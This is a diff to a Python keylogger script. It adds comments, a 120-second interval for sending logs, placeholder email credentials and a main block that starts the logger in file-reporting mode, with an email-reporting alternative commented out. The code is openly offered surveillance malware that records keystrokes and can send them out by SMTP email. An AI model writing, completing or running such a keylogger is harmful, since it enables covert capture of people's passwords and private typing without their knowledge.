@@ -5,17 +5,20 @@
 # look into 'keyloggers' module and 'keyboard' module
 
 import keyboard
-import smtplib
+import smtplib      # used for emailing the keylogs
 
 from threading import Timer
 from datetime import datetime
 from email.mime.multipart import MIMEMultipart
 from email.mime.text import MIMEText
 
-SEND_INTERVAL = 120 # number of seconds to send the string
+# send the keylog every X number of seconds
+SEND_INTERVAL = 120 
 
+# replace these values with your own email login, if you want to email the keylogs
 EMAIL_ADDRESS = "Dwight.Schrute@DunderMifflin.com"
 EMAIL_PASSWORD = "BearsBeetsBattlestarGalactica"
+
 
 class Keylogger:
     def __init__(self, interval, report_method="email"):
@@ -153,3 +156,9 @@ class Keylogger:
         keyboard.wait()
 
 
+if __name__ == "__main__":
+
+    keylogger = Keylogger(interval=SEND_INTERVAL, report_method="file") # replace this line for email
+    keylogger.start()
+
+    # keylogger = Keylogger(interval=SEND_INTERVAL, report_method="email")
